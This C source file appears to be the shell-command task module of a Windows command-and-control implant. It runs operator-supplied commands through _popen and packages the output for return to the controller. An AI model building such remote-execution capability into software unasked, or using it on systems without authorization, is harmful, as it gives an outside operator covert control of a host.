#include "Tasks/Shell.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_SHELL
VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    FILE *fp;
    CHAR path[1035];
    SIZE_T size = 0;
    PCHAR cmd = ParserStringCopy(arguments, &size);

    PPackage temp = PackageInit(0, FALSE);

    fp = _popen(cmd, "rb");     // TODO: Fix so it doesn't hang. This hangs until child process is done. 
    if (!fp)    
    {
        DWORD error = GetLastError();
        _err("[CMD_SHELL] code : %d", error);

        // Error
        PackageError(taskUuid, error);
        goto end;
    }

    while (fgets(path, sizeof(path), fp) != NULL)
    {
        PackageAddString(temp, path, FALSE);    // Don't wanna copy size of each individual string or won't read data correctly.
    }

    _pclose(fp);

    // success
    PackageComplete(taskUuid, temp);
end:
    // Cleanup
    LocalFree(cmd);
    PackageDestroy(temp);
}
#endif